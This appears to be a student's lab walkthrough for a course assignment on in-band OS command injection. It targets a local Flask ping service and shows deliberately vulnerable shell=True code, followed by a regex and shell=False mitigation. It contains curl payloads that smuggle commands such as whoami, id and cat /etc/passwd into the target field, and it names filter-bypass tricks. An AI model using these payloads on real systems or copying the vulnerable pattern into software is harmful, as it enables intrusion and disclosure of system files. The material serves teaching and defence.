# OS Command Injection — Complete Walkthrough & Demo Guide

> **Course:** Cyber Security (IT-30001) | IIITA | Autumn 2026  
> **Instructor:** Dr. Soumyadev Maity  
> **Category:** OS Command Injection  
> **Variant:** In-Band (Command output returned to the browser)

---

## Part 0 — Prerequisites (One-Time Setup)

```bash
# 1. Navigate to the project directory
cd /home/varun/os-command-injection-assignment

# 2. Create a Python virtual environment and install Flask
uv venv
uv pip install flask

# 3. Verify everything is installed
.venv/bin/python -c "import flask; print('Flask', flask.__version__, '— ready')"
```

Expected output:
```
Flask 3.1.3 — ready
```

---

## Part 1 — Run the Automated Test Suite

Before touching the browser, prove that both the vulnerability and the defense work programmatically.

```bash
# Run all 4 automated tests
.venv/bin/python test_exploit.py
```

Expected output:
```
======================================================================
 Running Automated Verification Suite for OS Command Injection Lab
======================================================================

[TEST 1] Vulnerable Mode with Benign Input ('127.0.0.1'):
  -> PASS: Benign ping executed successfully.

[TEST 2] Vulnerable Mode with In-Band Exploit ('127.0.0.1; id; echo '__EXPLOIT_VERIFIED__''):
  -> PASS: In-band OS command injection executed successfully.
  -> Output snippet:
     2 packets transmitted, 2 received, 0% packet loss, time 1014ms
     rtt min/avg/max/mdev = 0.062/0.064/0.066/0.002 ms
     uid=1000(varun) gid=982(users) groups=982(users),959(docker),963(ollama),998(wheel)
     __EXPLOIT_VERIFIED__

[TEST 3] Mitigated Mode with Benign Input ('127.0.0.1'):
  -> PASS: Mitigated endpoint executes valid host successfully.

[TEST 4] Mitigated Mode with Exploit Payload ('127.0.0.1; id; echo '__EXPLOIT_VERIFIED__''):
  -> PASS: Exploit successfully intercepted and blocked by security filter.
  -> Defense response: SECURITY ALERT: Request blocked by allow-list filter.
     Shell metacharacters or invalid hostnames are strictly prohibited.

======================================================================
 ALL 4 TESTS PASSED! Verification Complete.
======================================================================
```

**What this proves:** The vulnerable code path executes arbitrary injected commands and leaks the output. The mitigated code path blocks the exact same payload.

---

## Part 2 — Start the Web Server

```bash
# Start the Flask development server
.venv/bin/python app.py
```

Expected output:
```
======================================================================
  IIITA Cyber Security Lab (IT-30001) - OS Command Injection
  Server starting on http://127.0.0.1:5000
======================================================================
 * Serving Flask app 'app'
 * Debug mode: on
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:5000
```

Now open your browser and go to **http://127.0.0.1:5000**.

> Leave this terminal running. Open a second terminal for the `curl` commands below.

---

## Part 3 — Demonstrate the Vulnerability (Exploit)

### 3.1 — Benign Request (Normal Usage)

In a second terminal, or using the browser UI, send a normal ping:

```bash
curl -s -X POST http://127.0.0.1:5000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1", "mode": "vulnerable"}' | python3 -m json.tool
```

Expected output (trimmed):
```json
{
    "status": "success",
    "mode": "vulnerable",
    "executed_command": "ping -c 2 127.0.0.1",
    "output": "PING 127.0.0.1 ... 2 packets transmitted, 2 received, 0% packet loss ...",
    "returncode": 0
}
```

**Observation:** The server ran `ping -c 2 127.0.0.1` and returned the normal ping output. Nothing malicious here — this is the intended functionality.

---

### 3.2 — Exploit 1: Identify the Current User (`whoami`)

```bash
curl -s -X POST http://127.0.0.1:5000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1; whoami", "mode": "vulnerable"}' | python3 -m json.tool
```

Expected output (key part):
```json
{
    "status": "success",
    "mode": "vulnerable",
    "executed_command": "ping -c 2 127.0.0.1; whoami",
    "output": "PING 127.0.0.1 ... 2 packets transmitted ...\nvarun\n",
    "returncode": 0
}
```

**What happened:**
- The server built the string `ping -c 2 127.0.0.1; whoami`.
- Because `shell=True` was used, `/bin/sh` treated `;` as a command separator.
- It ran `ping -c 2 127.0.0.1` first, then ran `whoami` second.
- Both outputs were captured and returned in the HTTP response (**in-band**).

---

### 3.3 — Exploit 2: Full System Reconnaissance (`id`, `uname -a`)

```bash
curl -s -X POST http://127.0.0.1:5000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1; id; uname -a", "mode": "vulnerable"}' | python3 -m json.tool
```

Expected output (key lines inside `"output"`):
```
uid=1000(varun) gid=982(users) groups=982(users),959(docker),963(ollama),998(wheel)
Linux archlinux 6.12.1-arch1-1 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux
```

**Impact:** The attacker now knows the user ID, group memberships, kernel version, and CPU architecture of the server — all from a single HTTP request.

---

### 3.4 — Exploit 3: Read Sensitive Files (`/etc/passwd`)

```bash
curl -s -X POST http://127.0.0.1:5000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1; cat /etc/passwd | head -5", "mode": "vulnerable"}' | python3 -m json.tool
```

Expected output (key lines inside `"output"`):
```
root:x:0:0::/root:/bin/bash
bin:x:1:1::/:/usr/bin/nologin
daemon:x:2:2::/:/usr/bin/nologin
mail:x:8:12::/var/spool/mail:/usr/bin/nologin
ftp:x:14:11::/srv/ftp:/usr/bin/nologin
```

**Impact:** The attacker has dumped system user accounts from the password file. On a real server, this is a major information disclosure.

---

### 3.5 — Exploit 4: List Running Processes (`ps aux`)

```bash
curl -s -X POST http://127.0.0.1:5000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1 && ps aux | head -6", "mode": "vulnerable"}' | python3 -m json.tool
```

**Impact:** The attacker enumerates active services to find further targets.

---

### 3.6 — Browser UI Demonstration (For the Video)

Instead of `curl`, you can do the exact same thing in the browser:

1. Open **http://127.0.0.1:5000**
2. Ensure the **⚠️ Vulnerable Service (shell=True)** toggle is selected (red)
3. Type `127.0.0.1` in the target field → click **Send Diagnostic Request** → observe normal ping output
4. Now type `127.0.0.1; whoami; id; uname -a` → click **Send Diagnostic Request**
5. **Observe:** Below the ping statistics, the terminal panel shows the injected command output (`varun`, `uid=1000(varun)...`, `Linux archlinux...`)

> **Screenshot / Record this moment** — this is your Table 2 (b) "Working Exploit" evidence.

---

## Part 4 — Vulnerable Code Explained (Show This in Video)

Open `app.py` in your editor. The vulnerable code is at lines 36–54:

```python
# (a) VULNERABLE IMPLEMENTATION — app.py, lines 36-54
command = f"ping -c 2 {target}"       # <-- User input concatenated directly
process = subprocess.run(
    command,
    shell=True,          # <-- Passes to /bin/sh -c  (THE FLAW)
    capture_output=True, # <-- stdout+stderr captured (IN-BAND leakage)
    text=True,
    timeout=6
)
output = process.stdout + process.stderr
return jsonify({"output": output})     # <-- Returned to browser
```

### (c) Root Cause — Why This Works (Two Sentences)

> User input is concatenated directly into a shell command string without any sanitization. Passing this string to `subprocess.run()` with `shell=True` invokes the system shell (`/bin/sh -c`), which interprets metacharacters like `;`, `&&`, `|`, and backticks as command separators — executing arbitrary attacker-supplied commands whose output is piped directly into the HTTP response.

---

## Part 5 — Demonstrate the Mitigation (Defense)

### 5.1 — Switch to Mitigated Mode and Replay the Same Exploit

Using `curl`:

```bash
curl -s -X POST http://127.0.0.1:5000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1; whoami; id; uname -a", "mode": "mitigated"}' | python3 -m json.tool
```

Expected output:
```json
{
    "status": "blocked",
    "mode": "mitigated",
    "executed_command": null,
    "message": "SECURITY ALERT: Request blocked by allow-list filter. Shell metacharacters or invalid hostnames are strictly prohibited.",
    "output": "[SECURITY_FILTER_TRIGGERED] Input '127.0.0.1; whoami; id; uname -a' rejected by allow-list pattern r'^[a-zA-Z0-9.-]+$'."
}
```

**Result:** HTTP 400. No command was executed. The payload was stopped at the input validation layer.

---

### 5.2 — Verify Legitimate Requests Still Work

```bash
curl -s -X POST http://127.0.0.1:5000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1", "mode": "mitigated"}' | python3 -m json.tool
```

Expected output:
```json
{
    "status": "success",
    "mode": "mitigated",
    "executed_command": "ping -c 2 127.0.0.1",
    "output": "PING 127.0.0.1 ... 2 packets transmitted, 2 received, 0% packet loss ...",
    "returncode": 0
}
```

**Result:** Legitimate hostnames and IPs still work normally. The mitigation does not break functionality.

---

### 5.3 — Browser UI Demonstration (For the Video)

1. In the browser, click the **🛡️ Mitigated Service (shell=False + Regex)** toggle (it turns green)
2. Type the exact same exploit: `127.0.0.1; whoami; id; uname -a`
3. Click **Send Diagnostic Request**
4. **Observe:** The terminal panel shows **"SECURITY ALERT: Request blocked by allow-list filter"** in red. No command output is leaked.

> **Screenshot / Record this moment** — this is your Table 2 (d) "Mitigation blocking the same payload" evidence.

---

## Part 6 — Mitigated Code Explained (Show This in Video)

Open `app.py`. The mitigated code is at lines 75–104:

```python
# (d) IMPLEMENTED MITIGATION — app.py, lines 75-104

# Defense Layer 1: Strict Allow-List Regex
allowlist_regex = r"^[a-zA-Z0-9.-]+$"
if not re.match(allowlist_regex, target):
    return jsonify({"status": "blocked", ...}), 400
    # ^ Rejects input containing ; & | ` $ ( ) > < spaces newlines etc.

# Defense Layer 2: Parameterized Execution (Avoid the Shell)
cmd_args = ["ping", "-c", "2", target]
process = subprocess.run(
    cmd_args,
    shell=False,         # <-- NO shell. Calls OS execve() directly.
    capture_output=True,
    text=True,
    timeout=6
)
```

### Why This Works

| Defense Layer | What It Does | Why It Stops the Attack |
| :--- | :--- | :--- |
| **Allow-list regex** `^[a-zA-Z0-9.-]+$` | Only permits alphanumeric characters, dots, and hyphens | Semicolons, spaces, pipes, ampersands, backticks — all rejected before any execution happens |
| **`shell=False` with argument vector** | Passes `["ping", "-c", "2", target]` directly to the kernel `execve` syscall | The OS never invokes `/bin/sh`. Even if a malicious string bypassed regex, `ping` would receive it as a single literal hostname argument and simply fail with "unknown host" |

---

## Part 7 — Other Mitigations: Theory from Lecture Slides

> *Assignment Table 2 (e): Summarise the other mitigation options from the slides.*

The course lecture slides identify four defense strategies for OS command injection. My implementation uses strategies 2 and 3. Here is the full theoretical overview of all four:

### 1. Avoid the Shell Entirely (Use Native APIs)
Instead of calling an external OS binary (`ping`) through a subprocess, use a native programming language library (e.g., Python's `socket` module, `scapy`, or the `ping3` pip package) to perform the network check directly. Since no shell process or external binary is ever spawned, command injection becomes architecturally impossible — there is simply no command interpreter to inject into.

### 2. Parameterized Execution with an Argument Vector *(Implemented)*
Instead of constructing a single command string, separate the binary name and each argument into discrete elements of a list: `["ping", "-c", "2", user_input]`. Execute with `shell=False`. The runtime calls the OS kernel `execve` syscall directly, passing the list as the `argv` array. The kernel never invokes a shell, so characters like `;`, `&&`, `|`, or backticks are treated strictly as literal bytes in the argument — not as executable syntax.

### 3. Allow-List (Whitelist) Input Validation *(Implemented)*
Before processing, validate user input against a strict regular expression that permits only known-safe characters (e.g., `^[a-zA-Z0-9.-]+$` for hostnames/IPs). Any input containing shell metacharacters is immediately rejected at the application boundary. This is superior to blacklisting because blacklists are inherently incomplete — attackers can bypass them with alternative delimiters (`${IFS}`, `%0a` newlines, etc.).

### 4. Principle of Least Privilege and Sandboxing
Run the web server process under a dedicated, low-privilege system account (e.g., `www-data` or `nobody`) with no sudo access and minimal filesystem permissions. Deploy inside a container (Docker), chroot jail, or enforce a seccomp/AppArmor security profile. Even if an attacker achieves arbitrary command execution through an unforeseen bypass, the blast radius is contained — they cannot read `/etc/shadow`, install packages, pivot to other hosts, or escalate privileges.

---

## Part 8 — Project File Structure

```
os-command-injection-assignment/
├── app.py                  # Flask server with vulnerable + mitigated endpoints
├── templates/
│   └── index.html          # Interactive web dashboard (single-page)
├── test_exploit.py         # Automated 4-test verification suite
├── requirements.txt        # Python dependencies (flask)
├── run.sh                  # One-command launcher (./run.sh or ./run.sh test)
├── README.md               # Full documentation with Table 3 ownership
├── VIDEO_SCRIPT.md         # Word-for-word 2.5-minute narration script
├── WALKTHROUGH.md           # ← This file
└── .gitignore
```

---

## Part 9 — Push to GitHub

```bash
cd /home/varun/os-command-injection-assignment

# Create a public GitHub repo (e.g. "iiita-cybersec-web-security") on github.com first, then:
git remote add origin git@github.com:<your-username>/<repo-name>.git
git push -u origin main
```

Share the repository link on the course page as instructed.

---

## Part 10 — Viva Quick-Reference Q&A

**Q: What is "In-Band" command injection?**  
A: The output of the injected command is returned directly inside the HTTP response body. The attacker sees the result immediately in the browser or API response.

**Q: How does it differ from Blind command injection?**  
A: In Blind injection, the server does not return command output. The attacker must infer success using side-channels: time delays (`sleep 5` causing a measurable response delay) or out-of-band callbacks (the injected command makes a DNS/HTTP request to an attacker-controlled server).

**Q: Why is `shell=True` the root cause?**  
A: `shell=True` causes Python to pass the command string to `/bin/sh -c`. The shell interpreter treats metacharacters (`;`, `&&`, `|`, `` ` ``, `$()`) as syntax. With `shell=False`, Python calls the OS `execve` syscall directly — no shell is involved, so metacharacters are just literal bytes.

**Q: Why not use a blacklist (block `;` and `&`) instead of a whitelist?**  
A: Blacklists are fragile. Attackers can bypass them with alternative separators: newline (`%0a`), `${IFS}` (internal field separator), pipes (`|`), backticks, `$(...)` subshells, or encoding tricks. A whitelist that only permits known-good characters is definitively safer.

**Q: Even without the regex, would `shell=False` alone stop the attack?**  
A: Yes. With `shell=False` and `["ping", "-c", "2", "127.0.0.1; whoami"]`, the entire string `127.0.0.1; whoami` is passed as a single argument to `ping`. The `ping` binary receives it as a literal hostname, fails with "unknown host", and no injection occurs. The regex is defense-in-depth.

**Q: What is defense-in-depth?**  
A: Layering multiple independent security controls so that if one fails, others still protect the system. Here: Layer 1 (regex) rejects bad input, Layer 2 (`shell=False`) prevents shell interpretation even if Layer 1 is bypassed.
